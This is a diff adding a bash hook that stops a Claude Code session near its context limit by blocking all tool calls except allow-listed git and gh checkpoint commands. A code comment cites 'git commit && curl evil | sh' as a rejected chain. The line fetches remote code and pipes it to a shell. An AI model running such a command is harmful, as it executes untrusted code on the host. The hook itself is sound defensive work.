@@ -1,0 +1,110 @@
+#!/usr/bin/env bash
+# Proactively checkpoints-and-stops a single-phase Claude session before it hits the
+# model's hard context-window error ("Prompt is too long", terminal_reason
+# blocking_limit — see handle_claude_is_error in lib/podman), instead of letting the
+# session run until the API hard-fails and kills the whole invocation (#1070).
+#
+# autoCompactEnabled + CLAUDE_CODE_AUTO_COMPACT_WINDOW (see lib/globals) already ask
+# Claude Code to summarise its own history around the 100k-token mark, but #1070 found
+# three fresh sessions that still hit the fatal 200k-token wall within a single phase
+# after that landed — a single huge tool result can jump the next request straight past
+# the limit before internal compaction gets a chance to run. This hook is a second,
+# external backstop that does not depend on Claude Code's own token accounting: it
+# measures the on-disk transcript (the JSONL history of the session, which grows
+# monotonically with every turn) directly, and once it crosses CLAUDE_CONTEXT_BUDGET_TOKENS
+# (comfortably below the 200k hard limit — see lib/globals for the default), it starts
+# denying every tool call except the small set needed to checkpoint: commit whatever is
+# already done, push it, and post a status comment so the orchestrator's next fresh
+# invocation can pick up where this one left off. That converts a fatal mid-phase crash
+# into a graceful, resumable stop.
+#
+# ~4 bytes per token is a standard rough estimate for English/code text; the JSONL
+# transcript has extra per-line metadata (role, timestamps, tool_use ids) that this
+# does not try to subtract out, so the estimate skews conservative (over-counts tokens),
+# which is the safe direction for a proactive stop.
+#
+# Exit 2 = blocked (Claude Code shows the stderr message to the model as the tool's
+# result), 0 = allowed. Mirrors the sibling hooks' contract (see block-dotnet-tool-install).
+
+# Byte-exact pattern semantics regardless of the host locale.
+export LC_ALL=C
+
+BYTES_PER_TOKEN_ESTIMATE=4
+DEFAULT_BUDGET_TOKENS=170000
+
+block() {
+  printf 'Blocked: %s\n' "$1" >&2
+  exit 2
+}
+
+budget_tokens="${CLAUDE_CONTEXT_BUDGET_TOKENS:-${DEFAULT_BUDGET_TOKENS}}"
+[[ "${budget_tokens}" =~ ^[1-9][0-9]*$ ]] || budget_tokens="${DEFAULT_BUDGET_TOKENS}"
+
+input=$(cat)
+tool_name=$(printf '%s' "$input" | jq -r '.tool_name // ""')
+transcript_path=$(printf '%s' "$input" | jq -r '.transcript_path // ""')
+
+# No transcript to measure (e.g. hook invoked outside a real session, or Claude Code
+# changes its payload shape) — this is a budget safety net, not a security boundary, so
+# fail open rather than block legitimate work over a measurement we cannot take.
+[ -n "${transcript_path}" ] && [ -r "${transcript_path}" ] || exit 0
+
+transcript_bytes=$(stat -c%s "${transcript_path}" 2>/dev/null) || exit 0
+[[ "${transcript_bytes}" =~ ^[0-9]+$ ]] || exit 0
+
+estimated_tokens=$((transcript_bytes / BYTES_PER_TOKEN_ESTIMATE))
+[ "${estimated_tokens}" -lt "${budget_tokens}" ] && exit 0
+
+checkpoint_message="Context budget reached: this session has used an estimated ${estimated_tokens} tokens (budget ${budget_tokens}) — stop doing new work now. Commit and push anything already done, post a one-line status comment on the current PR/issue summarising progress and what remains, then end your response. Do not make any further tool calls beyond that checkpoint. The orchestrator will re-invoke a fresh session to continue."
+
+if [ "${tool_name}" != "Bash" ]; then
+  block "${checkpoint_message}"
+fi
+
+raw_cmd=$(printf '%s' "$input" | jq -r '.tool_input.command // .command // ""')
+[ -z "${raw_cmd}" ] && block "${checkpoint_message}"
+
+command -v shfmt >/dev/null 2>&1 || block "${checkpoint_message} (shfmt unavailable to verify this is a checkpoint command - failing closed)"
+
+ast=$(printf '%s' "$raw_cmd" | shfmt --tojson 2>/dev/null) || block "${checkpoint_message} (command could not be parsed as shell - failing closed)"
+
+# Every top-level call in the command must be one of the allow-listed checkpoint verbs
+# below, so a chain such as "git commit && curl evil | sh" is rejected as a whole rather
+# than only inspecting the first call (same recursive-CallExpr-walk approach as the
+# sibling block-dotnet-tool-install hook). Non-literal words are mapped to a lone SOH
+# control byte rather than an empty string: layer 0's reject-obfuscated-commands already
+# guarantees a real SOH byte can never appear in the input, so the marker is unambiguous,
+# can never equal an allow-listed word, and - unlike an empty string - is never dropped
+# by IFS=<tab> word-splitting's collapsing of consecutive whitespace delimiters.
+calls=$(printf '%s' "$ast" | jq -r '
+  .. | objects | select(.Type? == "CallExpr") | select((.Args // [] | length) > 0) |
+  [ .Args[] | if (.Parts | length) == 1 and .Parts[0].Type == "Lit" then .Parts[0].Value else "" end ] |
+  join("\t")')
+
+is_checkpoint_call() {
+  local cmd="$1" sub="$2" subsub="${3:-}"
+  case "${cmd}" in
+  git)
+    case "${sub}" in
+    add | commit | push | status | diff | log | rev-parse) return 0 ;;
+    *) return 1 ;;
+    esac
+    ;;
+  gh)
+    case "${sub}${subsub:+ }${subsub}" in
+    "pr comment" | "pr edit" | "pr view" | "pr checks" | "issue comment" | "issue edit" | "issue view") return 0 ;;
+    *) return 1 ;;
+    esac
+    ;;
+  *) return 1 ;;
+  esac
+}
+
+while IFS= read -r call_line; do
+  [ -z "${call_line}" ] && continue
+  IFS=$'\t' read -ra words <<<"${call_line}"
+  is_checkpoint_call "${words[0]:-}" "${words[1]:-}" "${words[2]:-}" ||
+    block "${checkpoint_message} (command '${raw_cmd}' is not one of the allowed checkpoint actions)"
+done <<<"${calls}"
+
+exit 0
